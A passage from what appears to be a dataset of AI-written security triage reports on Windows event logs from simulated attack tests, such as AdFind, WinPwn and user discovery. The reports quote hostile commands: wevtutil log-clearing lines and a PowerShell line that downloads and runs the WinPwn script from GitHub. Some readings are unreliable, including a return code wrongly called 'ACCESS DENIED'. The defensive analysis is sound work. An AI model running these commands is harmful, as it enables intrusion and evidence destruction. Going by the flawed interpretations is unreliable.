  ""CommandLine"": ""\""C:\\Windows\\system32\\wevtutil.exe\"" cl Microsoft-Windows-Sysmon/Operational""
}
```

3. **Failed Credential Logins**:
   - Event ID 5379 indicates multiple failed attempts to read credentials related to MicrosoftAccount and WindowsLive, showing ReturnCode `3221226021` which signifies ""ACCESS DENIED"". These may represent unsuccessful attempts to access user credentials.
   
```json
{
  ""EventID"": ""5379"",
  ""ReturnCode"": ""3221226021"",
  ""TargetName"": ""MicrosoftAccount:user=02txoixylodcstop""
}
```

4. **Unusual Use of Command Line Tools**:
   - The execution of `whoami.exe`, `nltest.exe`, and other command-line tools in a short span is indicative of reconnaissance behavior, often seen in post-exploitation phases.

```json
{
  ""Image"": ""C:\\Windows\\System32\\whoami.exe"",
  ""CommandLine"": ""\""C:\\Windows\\system32\\whoami.exe\""""
}
```

**Assessment**:
Overall, the presence of multiple event log clearing activities coupled with unauthorized command-line executions and failed attempts to access account credentials suggests potentially malicious activity. While any single event might not be conclusive, the combination of them indicates a pattern often seen in environments attempting to obfuscate malicious activity through privilege misuse and the use of scripting to tamper with logs.

**Resolution**: SUSPICIOUS

**Guidance**:
- Conduct a thorough investigation on ""admin_test"" account activities. Confirm whether the actions were authorized. If not, it's crucial to secure this account and review permissions.
- Implement tighter access controls and monitoring over privileged user accounts and event logs.
- Analyze network logs around the time of these events for any anomalous connections or data transfers.
- Review endpoint security policies to ensure appropriate logging and real-time monitoring solutions are in place.
- Consider setting up alerts for actions such as log clearing and consistent use of `cmd.exe` to spot similar patterns in the future promptly."
GetCurrent User with PowerShell Script,"Upon examining the logs provided, several events stand out as potentially suspicious indicators and may suggest further investigation is warranted to assess the nature and context of activities:

1. **Clearing of Event Logs:**
   - A significant marker of potentially malicious activity is the clearing of event logs. Multiple entries indicate that the Security, System, and Windows PowerShell logs were cleared (EventID 1102 in Security log and EventID 104 in System log) by a user identified as `admin_test`, which may mask other malicious actions. This action is often performed by attackers to cover their tracks post-compromise.

2. **Use of Wevtutil.exe:**
   - The presence of `wevtutil.exe` being used multiple times to clear logs (`wevtutil.exe cl Microsoft-Windows-Sysmon/Operational`, `wevtutil.exe cl Application`, `wevtutil.exe cl System`, `wevtutil.exe cl Security`, `wevtutil.exe cl ""Windows PowerShell""`) is another indicator pointing towards actions designed to alter logging and evidence of system activity. This is not typical behavior for normal administrative activities unless explicitly warranted and justified with legitimate reasoning.

3. **Privileged Logon Events:**
   - The log entry with EventID 4624 indicates a system account (SYSTEM, Logon Type: 5 - Service) obtaining a successful logon, which aligns with legitimate service activity, but when associated with the context of log clearance, it warrants attention.

4. **PowerShell Activity:**
   - Certain PowerShell commands appear designed to output user identity information to a file (`[System.Security.Principal.WindowsIdentity]::GetCurrent() | Out-File -FilePath .\CurrentUserObject.txt`). While this by itself may not be harmful, in conjunction with log clearing and potential privilege escalation, it raises suspicion.

5. **Use of Administrative Privileges:**
   - EventID 4672 indicates that a wide array of privileges were utilized by the `SYSTEM` account, including `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, and others. This can be typical for system-level services, but within this context, it requires scrutiny.

Based on these log entries, the activity identified could potentially indicate that an entity with admin-like capabilities is engaging in behavior consistent with log manipulation and potential privilege abuse. Such actions are often associated with malicious intent, particularly when efforts are made to obscure system activities through deletion of logs.

### Resolution
- **SUSPICIOUS**: The logs contain suspicious activities that need further investigation. Specifically, determine why the logs were cleared, validate the necessity and authorization of 'admin_test' conducting these actions, and assess whether there has been unauthorized access or escalation.

### Guidance
- Confirm the legitimacy of `admin_test` account activities, including a detailed review of account permissions and recent changes.
- Investigate any other system changes during the same time window.
- Consider implementing and enforcing stricter logging, monitoring, and alerting on activities involving wevtutil.exe and other system utilities.
- Review additional logs from network and endpoint security solutions to identify lateral movement or data exfiltration attempts."
Adfind - Enumerate Active Directory Exchange AD Objects,"Upon review and analysis of the provided log entries, several factors stand out indicating suspicious behavior, which could potentially be malicious. Let's break down the findings:

1. **Event Log Clearing**:
   - Event ID: 1102 and 104 indicate that logs were cleared. These actions were performed by the user ""admin_test"". Clearing event logs is a technique often used by attackers to cover their tracks after gaining access to a system or performing malicious actions.

2. **Unusual Process Execution**:
   - There are frequent entries of processes like `wevtutil.exe` being executed by the ""admin_test"" user (e.g., Process IDs 5636, 5068, 4752, 1980). The primary function of `wevtutil.exe` is to query and manage Windows event logs, which aligns with log clearing.

3. **Command-Line Arguments and Execution of Potentially Dangerous Tools**:
   - The use of `cmd.exe` to execute `AdFind.exe` (as seen in the log with Process ID 7092) is particularly concerning. `AdFind.exe` is a legitimate tool but can be used for reconnaissance purposes in active directory environments.

4. **Privileged Logons**:
   - Multiple Event ID 4624 entries show consistent logon activities as SYSTEM through `Advapi`, indicative of possible privilege escalation or execution of tasks requiring elevated permissions.

5. **Unexpected Service Stops**:
   - The `edgeupdate` service was stopped multiple times without a clear reason. While not inherently malicious, unexpected stopping of services can be a part of a larger malicious strategy.

6. **Use of Administrative Tools**:
   - Several processes run by ""admin_test"" indicate checking of the environment details, e.g., `HOSTNAME.EXE`, `whoami.exe`. These are normal administrative tasks but require context. Coupled with the clearing of event logs and use of tools like `AdFind`, they raise suspicion.

Given these observations, the combination of event log clearing, use of tools like `AdFind.exe`, and execution of administrative utilities point strongly toward potential malicious activity.

**Resolution**: MALICIOUS

**Guidance**:
- Immediate action should be taken to isolate the host for a forensic investigation.
- Review system images or backups prior to the identified events to identify initial access points.
- Coordinate with IT to perform a credential hygiene assessment since elevated privileges could have been compromised.
- Monitor network behaviors closely to trace any further unauthorized data access or exfiltration attempts."
Suspicious LAPS Attributes Query with Get-ADComputer all properties,"### Detailed Analysis of Windows Event Logs

#### Overview of Analyzed Logs:
We have analyzed Sysmon, PowerShell, System, Security, and Application logs related to activities on `Server002`. The primary focus was to identify suspicious or anomalous behavior, potentially indicative of malicious activity.

#### Key Observations:

1. **Sysmon Logs:**
   - Multiple instances of `wevtutil.exe` being used to clear logs (`CommandLine` attribute with `cl` argument) for several channels, including `Microsoft-Windows-Sysmon/Operational`, `Application`, `Security`, `System`, and `Windows PowerShell`.
   - Identified the parent process as `wsmprovhost.exe`, which suggests a remote management session (typically Windows Remote Management).
   - Several `conhost.exe` executions linked as child processes of `wevtutil.exe` and other benign system processes.

2. **PowerShell Logs:**
   - PowerShell was used to execute `Get-ADComputer $env:computername -Properties *`. This command is typically used to gather information about the active directory computer object. However, its benignity depends on context such as frequency and purposes.
   - Correlation with the Sysmon log indicates that the PowerShell command was executed during or just after the log clearing activities.

3. **System Logs:**
   - It is evident due to the log clearing (`104`) events for all significant channels (Application, Security, System, PowerShell).
   - Frequent time changes recorded by `svchost.exe`, although potentially normal, could be used as an anti-forensic technique to confuse log timelines.

4. **Security Logs:**
   - Security logs were cleared, reinforcing the suspicion of concealment or cover-up of a specific activity.

5. **Application Logs:**
   - Show routine updates and software protection events but no direct indicators of compromise or attack.

#### Assessment:

- **Suspicious Behavior:** 
  - The use of `wevtutil.exe` to clear event logs, especially across multiple crucial channels, is highly unusual in typical operational scenarios and is a common tactic used to cover tracks during malicious activity or compromise.
  - The use of PowerShell in conjunction with these activities, although not inherently malicious, raises further suspicion due to the timing and context.
  
- **Log Clearing:**
  - Typically, only administrative users have the capability to clear logs, and without explicit documentation of this as part of a routine or maintenance procedure, it becomes highly suspicious.

#### Guidance:

1. **Immediate Actions:**
   - Investigate the account `SERVER002\\admin_test`, as it was involved in executing the suspicious commands.
   - Ensure comprehensive security policies are deployed regarding log access and clearing activities.
   - Restrict permissions to `wevtutil.exe` and audit all remote management sessions.

2. **Further Investigation:**
   - Cross-reference cleared log timelines with network activities to identify any unauthorized or unusual pattern.
   - Conduct a deeper forensic analysis for potential unauthorized access or persistence mechanisms.

#### Final Resolution:
- **SUSPICIOUS**: The activity surrounding the clearing of event logs and the timing of PowerShell execution, combined with remote management processes, indicates actions that warrant immediate detailed investigation to rule out or confirm malicious intent."
Suspicious LAPS Attributes Query with adfind all properties,"Upon analyzing the provided logs, several activities stand out that warrant a closer examination:

1. **Clearing of Event Logs**: 
   - There are multiple instances where log files were cleared, as indicated by EventID 104 in the System log and EventID 1102 in the Security log. This behavior is suspicious because clearing event logs can be an attempt to hide malicious or unauthorized activity. The user responsible for this action is ""admin_test"".

2. **Execution of PowerShell with Suspicious Scripts**:
   - A PowerShell process is executed with the command line including ""AdFind.exe"", which is located in a temporary directory: `C:\Users\ADMIN_~1\AppData\Local\Temp\`. AdFind is known to be used by attackers for Active Directory reconnaissance. The use of a temporary directory and presence of AdFind indicate potential malicious intent.

3. **Use of System Utilities**:
   - Frequent executions of `wevtutil.exe` are observed, which correlates with the clearing of logs. The command-line arguments also indicate that it was used for clearing channels like ""System"" and ""Security"".

4. **High Integrity Level Execution**:
   - Many process executions occur at a high integrity level, which gives processes elevated privileges potentially used for malicious purposes.

5. **Temporal Correlation**:
   - All these activities happen in a very short time frame, suggesting they are interconnected and part of a coordinated effort.

### Assessment:

The activities observed in the logs indicate:
- An attempt to gather system information potentially for reconnaissance (use of `AdFind.exe`).
- Actions to cover tracks by clearing different event logs.
- Execution of commands with possibly elevated privileges.

Given these observations, the behavior captured in these logs could indicate a compromise. Specifically, the presence of AdFind and log clearing are red flags and are classical signs of a post-exploitation activity sequence.

### Conclusion:
- **Resolution**: MALICIOUS

### Guidance for Further Action:
- Isolate the affected host (Server002) to prevent potential lateral movement within the network.
- Conduct a thorough investigation into the system to identify any backdoors or additional compromised accounts.
- Review and strengthen logging policies and the retention of logs.
- Assess all accounts and privileges associated with the affected machine, especially focusing on the ""admin_test"" account.
- Implement enhanced monitoring for similar activities within the network to catch any incidents early."

### Suspicious or Anomalous Behavior:
1. **Clearing of Event Logs:**
   - Several logs (System, Windows PowerShell, Security) were cleared within a very short timeframe. This behavior is logged under EventID 104 (for System and PowerShell) and EventID 1102 (for Security).
   - **Cleared by user**: `admin_test`.
   - Time of log clearing is around `2024-10-23 21:19:08`, which is suspicious as log clearing is often done to cover tracks by malicious users.

2. **Repeated PowerShell Execution:**
   - Multiple PowerShell processes were initiated with a command line that involves querying ActiveDirectory objects using PowerShell's `Get-ADObject`. The use of a specific LDAP filter for `UserAccountControl` could be indicative of:
     - A legitimate administrative task or
     - Enumeration of directory information by a malicious actor.
   - User executing these scripts: `SERVER002\\admin_test`.

3. **High-Integrity Level Processes:**
   - Processes such as `wevtutil.exe` (used for clearing event logs) and others are running with high integrity, indicating administrative privileges.

4. **Use of `wevtutil.exe`:**
   - `wevtutil.exe` was used multiple times to clear event logs channels including Application, System, and Security logs.

### Assessment of Malicious Activity or Compromise:
- The primary concern here is the intentional **clearing of event logs**, which is a behavior typically associated with malicious activity to cover tracks after performing unauthorized operations.
- The PowerShell command involving LDAP queries and the constant usage by the same user (`admin_test`) might suggest a script-based automation running with elevated privileges, which can be benign in a controlled and documented environment, but it’s suspicious without any clear context or documentation.

### Guidance and Resolution:
Based on the gathered evidence, the activity noted in the logs aligns with behaviors often indicative of potential malicious intent, especially due to the log clearing activity. Therefore, the situation should be marked as **SUSPICIOUS** for further investigation.

### Recommended Actions:
1. **Immediate Investigation:**
   - Review user `admin_test`'s recent activities and validate if the actions were authorized.
   - Check for documentation or a change request that might justify this behavior.

2. **Audit and Log Management:**
   - Ensure adequate monitoring and alerts are set up for log clearing activities, particularly focusing on administrator actions.
   - Implement stricter audit policies to capture detailed activity logs.

3. **User Validation:**
   - Validate if `admin_test` is a legitimate user with verified credentials and investigate if any credentials might have been compromised.

4. **Environment Scan:**
   - Run comprehensive security scans, focusing on suspicious administrative activity and potential backdoor openings.

By addressing these areas, further insights can be gathered about whether these actions were indeed malicious or part of an authorized process. More digging is necessary to come to a definite conclusion."
Discover System Language by Windows API Query,"After a detailed analysis of the provided Windows event logs from multiple channels, here is the assessment of the situation:

### Indicators of Anomalous or Suspicious Activity

1. **Event Log Clearing (EventID 104, 1102)**:
   - The logs reveal a series of events associated with the clearing of event logs. Specifically, the logs indicate the use of the `wevtutil.exe` command to clear the following logs: System, Security, and Windows PowerShell.
   - Event clearing or deletion is a significant indicator of potential malicious activity as it is often used by attackers to cover their tracks post-compromise. 
   - The subject username performing these actions is `admin_test`, which may suggest that an administrative account was used to perform these actions possibly with malicious intent.

2. **Suspicious Process Execution (Sysmon Events)**:
   - There is evidence of `cmd.exe` executing what appears to be a payload located in the `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\ExternalPayloads\\LanguageKeyboardLayout.exe`. This is a clear sign of suspicious activity as executing binaries from a temporary directory is often indicative of malicious intent.
   - The process lineage, involving `cmd.exe` and `wevtutil.exe` further supports the narrative of potential malicious activities or misuse.

3. **Execution of Processes with Elevated Tokens (Security Log EventID 4672)**:
   - Multiple instances of privileges being granted, including `SeDebugPrivilege`, are logged. While this might be part of normal operations, the context of these logs in conjunction with the event log clearing heightens suspicion.

4. **Account Activity**:
   - The user `SERVER002\admin_test` is associated with numerous activities related to event log clearing and execution of potential payloads, drawing further attention to the account itself. The name `admin_test` suggests a test or a non-standard user account, which should be scrutinized under these circumstances.

### Indicators of Potential Malicious Activity

1. **External Payload Execution**:
   - The execution of `LanguageKeyboardLayout.exe` payload signifies potentially malicious behavior, especially given its origin in a temporary folder typically used for interim storage.

2. **Covering Tracks**:
   - System and Security event logs clearing, along with PowerShell logs, coincide with the behavior associated with attackers aiming to obfuscate their presence on a host by removing logs that capture their activities.

### Final Assessment

Based on the evidence provided across System, Security, Sysmon, and Application logs, there are clear signs of potential compromise or unauthorized activity involving execution of suspicious binaries and clearing of logs. The behaviors closely align with common adversary tactics for maintaining persistence and covering tracks after an intrusion.

**Resolution: MALICIOUS**

### Recommendations and Next Steps

1. **Immediate Action**:
   - Quarantine and isolate the affected machine (Server002) to prevent further lateral movement or data exfiltration.
   - Conduct a thorough forensic analysis and memory dump examination on the isolated host to gather more evidence and understand the full scope of the intrusion.
   - Reset credentials and enforce secure password policies for the `admin_test` account and review its activity logs for any additional anomalies.
   
2. **Monitor and Detect**:
   - Increase logging and monitoring on critical systems to detect similar activities and improve visibility into user actions on sensitive systems.
   - Employ threat-hunting practices to actively search for indicators of compromise in other systems in the network.

3. **Review and Strengthen Security Posture**:
   - Implement stricter user role management and enforce the principle of least privilege to minimize the risk of similar incidents.
   - Conduct regular security awareness training for employees, emphasizing the importance of secure account practices and recognition of potential phishing and intrusion attempts.

These steps should help mitigate further compromise and provide clarity on any additional impact across the network."
Detect a Debugger Presence in the Machine,"In analyzing the provided event logs, several indicators of potentially suspicious activity stand out. Here’s a breakdown of the key points:

1. **Log File Clearing**: We see multiple instances of event logs being cleared (`EventID: 104` and `EventID: 1102`) by the user `admin_test`. These events include the clearing of the System, Security, and Windows PowerShell channels. Log clearing is often an action performed by malicious actors attempting to cover their tracks after an unauthorized or malevolent activity.

2. **Privilege Escalation**: The user `admin_test` is observed with elevated privileges, specifically with `SeDebugPrivilege` and several other high-level privileges, as seen in `EventID: 4672` of the Security log. This level of privilege can be used to bypass typical security protocols, which may be a tactic employed during an attack.

3. **Suspicious PowerShell Activity**: A PowerShell script appears to be running checks for debugger processes and debugging flags (observed in multiple PowerShell events). This behavior suggests a potential anti-analysis technique often used in malware to evade detection and analysis.

4. **Time Change Events**: There are events related to time changes (`EventID: 4616`), and discrepancies in system time adjustments can be leveraged for further obfuscation and to manipulate log timestamps.

5. **High-Integrity Level Process Executions**: There are several high-integrity processes executed, such as `wevtutil.exe`, which is used for clearing event logs, further supporting the assumption of malicious intent.

6. **Common Tools Execution**: The execution of `wevtutil`, `whoami`, and `hostname` by `admin_test` suggests reconnaissance and possible preparations for further actions. Such tools are commonly used to gather system information and verify access privileges.

7. **Edge Update Logs**: Multiple Edge Update processes are running with Task Scheduler-like parameters (e.g., `/svc`, `/c`), which may be benign on their own but should be investigated to rule out misuse, especially in conjunction with other suspicious activities.

**Assessment**: The amalgamation of these suspicious behaviors, particularly the log clearing, use of elevated privileges, PowerShell scripts with anti-debugging checks, and the sequential execution of reconnaissance tools, strongly suggests malicious activity.

**Resolution**: **MALICIOUS**

**Recommendations**:
- Immediately review user `admin_test` activity, credentials, and any IP activity associated with it.
- Investigate the integrity and origin of the PowerShell script detected in the logs.
- Implement stringent monitoring and potentially suspend the user credentials involved if unauthorized access is suspected.
- Conduct a full forensic analysis of the server to detect any planted malware or compromised data.
- Enhance logging and alerting mechanisms to prevent similar occurrences in the future.

This conclusion is drawn with a high level of certainty based on the observed attempts to cover tracks and execute sensitive commands typically used in preparatory and post-compromise phases of an attack."
User Discovery With Env Vars PowerShell Script,"Based on the analysis of the provided Windows event logs, the following observations stand out, indicating potential malicious activity:

1. **Log Clearing Events (Security Event ID 1102 & System Event ID 104):**
   - These events indicate that the logs were cleared shortly before or while the suspicious activity occurred. Clearing event logs is often performed by an attacker to hide their tracks after compromising a system. The user ""admin_test"" is associated with these actions, suggesting either this account was misused or the individual behind the account initiated these actions.

2. **Usage of `wevtutil` and `Windows Event Log Utilities**:**
   - The `wevtutil.exe` process being used to clear logs (as shown by various Sysmon Event IDs) corroborates the log clearing suspicion. This action is generally performed from an elevated privilege context, and its occurrence around the same timeframe as other potentially suspicious activities strengthens the case for suspicious behavior.

3. **PowerShell Script Execution:**
   - A PowerShell script executed with the following command line:
     ```
     ""powershell.exe"" & {[System.Environment]::UserName | Out-File -FilePath .\CurrentactiveUser.txt , $env:UserName | Out-File -FilePath .\CurrentactiveUser.txt -Append}
     ```
   - This script writes current active user information to a text file. While not inherently malicious, the timing, context, and the subsequent log clearing makes this suspicious.

4. **Failed Credential Access (Security Event ID 5379):**
   - The multiple instances of this event, all failing with the `ReturnCode: 3221226021`, indicate attempted and failed access to credentials. While these could happen due to legitimate reasons, their occurrence alongside log clearing and PowerShell execution could suggest reconnaissance or an attempt to escalate privileges.

5. **Kernel General and Update Events:**
   - While there are Kernel and Windows Update events, these generally pertain to system updates and appear benign without further context around interference or anomalies.

**Assessment:**
The log clearing activities, combined with the use of potentially malicious scripts and attempts to access credentials, indicate potentially suspicious activities. The `admin_test` account could have been compromised, or the actions could have originated from an internal misconfiguration or misuse.

**Resolution: SUSPICIOUS**

**Guidance on How to Proceed:**
1. **Investigate the ""admin_test"" User Account:**
   - Determine if this user had legitimate reasons and the capability to perform these actions.
   - Check for any history of this account's usage or recent changes.

2. **Close Monitoring & Temporary Isolation:**
   - Monitor the system closely for any further signs of log clearing or unusual activities.
   - Consider isolating the server if new suspicious activities are detected.

3. **Perform a Full Security Audit:**
   - Audit all user accounts and processes on the affected system.
   - Check network logs and other security tools for correlated suspicious activities.

4. **Strengthen Security Controls:**
   - Restrict the ability for accounts to clear logs.
   - Increase monitoring on PowerShell activity and use of system utilities like `wevtutil`.

5. **Incident Response:**
   - If new indicators of compromise appear, engage the incident response team for deeper analysis and potential remediation steps.
"
File and Directory Discovery (PowerShell),"Upon reviewing the provided Windows event logs, I have gathered the following points of interest:

1. **Windows Event Log Clearing:** There are multiple `wevtutil.exe` executions to clear event logs as observed in the System and Security logs. Specifically, the command lines being executed are:
   - `wevtutil.exe cl Microsoft-Windows-Sysmon/Operational`
   - `wevtutil.exe cl Application`
   - `wevtutil.exe cl System`
   - `wevtutil.exe cl Security`
   - `wevtutil.exe cl ""Windows PowerShell""`

   In the System log, several `EventID: 104` logs indicate the System and Windows PowerShell logs were cleared by the user `admin_test`. Clearing logs, especially security and application logs, is a common tactic used to cover tracks after unauthorized activities.

2. **PowerShell Usage:** There's a PowerShell session with command line arguments that include recursive listing commands such as `ls -recurse, get-childitem -recurse, gci -recurse`. This activity can signify an attempt to list files and directories, potentially to search for sensitive data. While not inherently malicious, it could be part of a broader suspicious activity pattern when considered alongside other behaviors, such as event log clearing.

3. **Time Change Event:** In the Security and System logs, an event indicates a system time change:
   - **Security log (EventID: 4616)** and **System log (EventID: 1)** record changes to the system time performed by the process `svchost.exe`. This manipulation of system time can be a tactic to affect timestamp accuracy on logs and files, further illustrating potential attempts to obfuscate activities on the system.

4. **System Integrity:** All actions in the logs are consistently performed by the `admin_test` user on `SERVER002`. This account executes high-integrity operations, implying elevated privileges.

**Assessment:**

The activities observed in the logs align with common indicators of suspicious behavior. The combination of event log clearing using `wevtutil.exe`, possibly to cover traces of the actions being performed, along with the system time manipulation, and recursive file listing through PowerShell, collectively suggest potentially malicious conduct. Without additional context or data, these activities, while not definitively proving malicious intent, warrant further investigation due to the alignment with known tactics for evading detection and performing reconnaissance within a system.

**Resolution:**

- **SUSPICIOUS** - The activities suggest abnormal behavior that warrants further investigation to discern the true intent and context behind these actions. Immediate attention should be given to reviewing logs, user permissions, recent changes on the system, and other related indicators of compromise. Additionally, measures such as isolating the system and checking for unauthorized access should be considered."
Elevated group enumeration using net group (Domain),"Based on the provided Windows event logs, here is a detailed analysis of the log entries focusing on any suspicious or anomalous behavior:

### Analysis of Sysmon Logs:
1. **EdgeUpdate Processes**:
   - Multiple instances of `MicrosoftEdgeUpdate.exe` and `MicrosoftEdgeUpdateComRegisterShell64.exe` are observed. These processes typically relate to updating Microsoft Edge, and no unusual command-line parameters or behaviors are noted here. Execution as `NT AUTHORITY\SYSTEM` is expected for system updates.

2. **Wevtutil and Command-Line Activity**:
   - Several instances of `wevtutil.exe` with command-line options `cl` for clearing logs suggest that someone with administrative privileges may be cleaning event logs.
   - The clearing of the logs is further confirmed by System log entries, where the event channels like System, Security, and Windows PowerShell were cleared by the same user.

3. **Suspicious use of 'cmd.exe' and 'net.exe'**:
   - A `cmd.exe` process with a command line that includes `net group` commands to enumerate or potentially manipulate Active Directory group memberships. The specific groups listed (Account Operators, Exchange Organization Management, Backup Operators, Domain Admins) could represent a reconnaissance activity to understand the network privileges better.
   - It should be noted that the command references incorrect syntax typographical errors like `/doma` instead of the correct `/domain`.

4. **Whoami and Hostname Executions**:
   - The `whoami.exe` execution is seen, which is commonly used to verify the current logged-in user’s context. It doesn’t appear too frequently suspicious, but in the context of other activities, it might indicate a validation attempt of operational capabilities by the executor.
   - `hostname.exe` execution follows a similar logic, often used for identifying the system’s name.

### Analysis of System Logs:
- The logs indicate that multiple event logs (System, Windows PowerShell, Security) were cleared by the user `admin_test`, which is often a tactic used to cover tracks after unauthorized or suspicious activities.

### Analysis of Security Logs:
- The log with the EventID 1102 (`Security log cleared`) suggests potential malicious intent, as this often is a step involved in covering up tracks post-intrusion.
- Logon and privilege escalation appear normal for the `admin_test` user; however, the context of the activity suggests inconsistency with routine administrative tasks.

### Application Log:
- No suspicious activity was noted in the Application log except for typical operations expected from the Software Protection Platform Service.

### Assessment and Resolution:
Given the indications of log clearing, suspicious command-line executions, particularly those concerning user/group enumeration, and their close temporal proximity, the activities are indicative of potentially unauthorized or exploratory behavior aimed at determining or escalating privileges.

**Resolution: SUSPICIOUS**

### Guidance:
- **Immediate Actions**:
  - Verify with the IT team if the activities by `admin_test` were authorized or part of regular maintenance.
  - Implement or review stricter log archival policies to ensure logs are not easily cleared or lost.
  - Conduct a review of account activities for `admin_test` and other administrative accounts to check for anomalies in usage or access patterns.
  
- **Long-term Measures**:
  - Implement enhanced monitoring and alerting mechanisms for log clearing and administrative command execution.
  - Consider additional training for system administrators on identifying and reporting abnormal behaviors.
  
Further investigation and potentially forensic actions are advised to confirm whether these activities resulted from malicious intent or were part of legitimate but mismanaged operations."
WinPwn - powerSQL,"After analyzing the provided log entries, several indicators point to potentially malicious activity:

### Indicators of Malicious Activity:
1. **Log Clearing Events**:
   - Multiple ""LogFileCleared"" events (Security Event ID 1102 and System Event ID 104) indicate that logs were cleared by the user `admin_test`, which is a common step attackers take to cover their tracks.
   - The `wevtutil.exe` process, which is a legitimate tool used to clear logs, was invoked multiple times by `admin_test`.
   
2. **Execution of Suspicious Scripts**:
   - The Sysmon logs show the execution of a PowerShell script from the user `admin_test`, with a suspicious PowerShell command that includes downloading and executing a script from a potentially malicious GitHub repository (`https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/...`). This could indicate that the system was targeted by a script intended for exploitation or reconnaissance.
   
3. **High Privilege Activities**:
   - There are multiple 4624 (Logon) events and 4672 (Special Privileges Assigned) events for the SYSTEM account, combined with the activity of normally non-interactive processes such as `wevtutil.exe`.
   
4. **Frequent and Unusual Process Creations**:
   - The frequent execution of high-privileged processes by the `admin_test` user can be viewed as suspicious, especially when coupled with the clearing of event logs.
   
5. **Multiple Failed Credential Access Attempts**:
   - Security Event ID 5379 shows attempts to retrieve credentials that failed (`ReturnCode=3221226021`), suggesting that there were unauthorized attempts to access credential material.

### Assessment and Resolution:

Based on the indicators from the logs, there is strong evidence pointing toward malicious activities targeting this host. The clearing of logs, suspicious PowerShell executions, and failed credential access attempts are clear signs of possible compromise.

The resolution for this investigation:
- **MALICIOUS**: The logs contain activity that is consistent with tactics seen in real-world attacks, including log clearing, script execution from untrusted sources, and unauthorized access attempt patterns.

### Guidance on How to Proceed:
1. **Isolation**: Immediately isolate the affected system from the network to prevent further compromise or data exfiltration.
2. **Incident Response**: Activate the incident response plan to contain and investigate the scope of the breach.
3. **Further Investigation**: Deep dive with a comprehensive forensic analysis to understand the breach's full scope, identify any potential exfiltration or lateral movement, and assess the damage.
4. **Remediation**: Cleanse the affected systems, patch vulnerabilities, enforce least privilege access, and reset credentials.
5. **Monitor and Re-Evaluate**: Enhance monitoring to detect any similar activity in the future and re-evaluate security controls to prevent recurrence."
System Owner-User Discovery,"**Detailed Analysis:**

Upon analyzing the provided Windows event logs, I have identified several points of concern that may indicate suspicious activity:

1. **Event Log Clearing:**
   - The Event ID 1102 in the security log and Event ID 104 in the system log indicate that the event logs were cleared by the user ""admin_test."" This is often an attempt by an attacker to remove traces of their activities and is therefore highly suspicious.

2. **Process Executions:**
   - Multiple instances of `wevtutil.exe` (the Eventing Command Line Utility) are executed to clear logs for different channels (`Sysmon`, `Application`, `System`, and `Windows PowerShell`). This is done by the same user (`admin_test`), suggesting an attempt to cover tracks.
   - `cmd.exe` is extensively used with various command-line arguments aimed at enumerating user accounts, sessions, and accessing local or remote sessions (`qwinsta`, `quser`, `wmic`). These commands can be indicative of reconnaissance activities by an attacker.

3. **Use of WMIC and Reconnaissance Commands:**
   - The use of `WMIC` to get all user accounts and `qwinsta` to list terminal sessions is consistent with typical reconnaissance efforts undertaken after gaining unauthorized access.

4. **Account Enumeration:**
   - The logs show multiple Event ID 4798 entries relating to enumeration of local accounts on the system by `admin_test`, further supporting the notion of reconnaissance.

5. **Software Update and Security Intelligence Update:**
   - Logs related to Windows Update and Microsoft Defender Antivirus updates are legitimate background activities expected on a Windows host. No anomalies detected in this context.

**Assessment:**

Based on the outlined suspicious activities, particularly the clearing of event logs and the execution of command-line utilities for reconnaissance, it is reasonable to suspect potential malicious activity. The activities observed — especially log clearance and account enumeration — are consistent with typical actions conducted during or following a compromise.

**Resolution:**

**SUSPICIOUS**

**Guidance on How to Proceed:**

1. **Immediate Action:**
   - Investigate the `admin_test` account for unauthorized access or compromise. Check for recent changes in permissions or passwords.
   - Review any additional logs or detection systems for correlating malicious activities.

2. **Response:**
   - Temporarily disable and further secure any accounts showing anomalous behavior.
   - Consider isolating the affected host from the network to prevent further potential spread until the investigation is complete.

3. **Forensic Analysis:**
   - Preserve all log data and initiate a detailed forensic analysis.
   - Check for any unauthorized access or changes that may have occurred in conjunction with these activities.

These steps will help ensure comprehensive mitigation of any potential threats and prevent further unauthorized activity."
WinPwn - GPORemoteAccessPolicy,"Based on an analysis of the provided logs, several indicators suggest potential malicious activity. Below are key observations:

### Windows PowerShell log (Malicious Activity):
- **Indicator**: The PowerShell logs show that a script from a potentially suspicious source is being executed. The line `powershell.exe & $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t' iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') GPORemoteAccessPolicy -consoleoutput -noninteractive` indicates the download and execution of a remote script without any interactive console output.
- **Assessment**: The action of downloading and executing scripts from URLs that are not verified or trusted strongly indicates malicious behavior. This could be an attempt to deploy malicious payloads or execute unauthorized commands on the server.

### Security log (Anomalous Activity):
- **Indicator**: The security events show a series of actions including the clearing of logs, such as Event ID 1102 indicating that the event logs have been cleared, which could indicate an attempt to cover tracks.
- **Privilege Escalation**: Event ID 4672 shows high privileges being used (`SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, etc.), a potential sign of privilege escalation, especially in conjunction with the actions observed.
- **Event Timing**: There is evidence of system time manipulation (Event ID 4616). This action can be part of an attempt to bypass time-based security measures or to alter timestamps in the logs for hiding activities.

### System log (Suspicious Activity):
- **Event Log Clearing**: The System log also indicates that logs have been cleared (Event ID 104), which is unusual and further supports potential cover-up activities.

### Guidance:
1. **Immediate Steps**:
   - Isolate the affected host from the network to prevent further potential data exfiltration or malicious activities.
   - Capture a disk and memory image for full forensic analysis.
   - Investigate the URL used to download and execute the PowerShell script to assess additional threats.

2. **Further Investigation**:
   - Check other systems for similar PowerShell execution patterns.
   - Investigate user account activities, especially `admin_test`, to assess if the credentials have been compromised or if the user is involved.
   - Review access logs and firewall logs for unauthorized access patterns that coincide with the event timestamps.

3. **Remediation**:
   - Change passwords for all potentially affected accounts, particularly those with administrative or root access.
   - Update and patch all systems to mitigate any known vulnerabilities that may have been exploited.
   - Consider deploying enhanced endpoint detection and response solutions to monitor for similar activities across the environment.

### Resolution:
**MALICIOUS** - The logs contain clear indicators of unauthorized actions that align with known malicious activities, including the execution of potentially suspicious scripts and system log manipulation. Steps should be taken immediately to respond to and remediate the potential compromise."
Enumerate Active Directory Users with ADSISearcher,"Upon analyzing the provided logs from various event sources, several observations can be made that suggest potential suspicious activity:

1. **Log Clearing Activity**: 
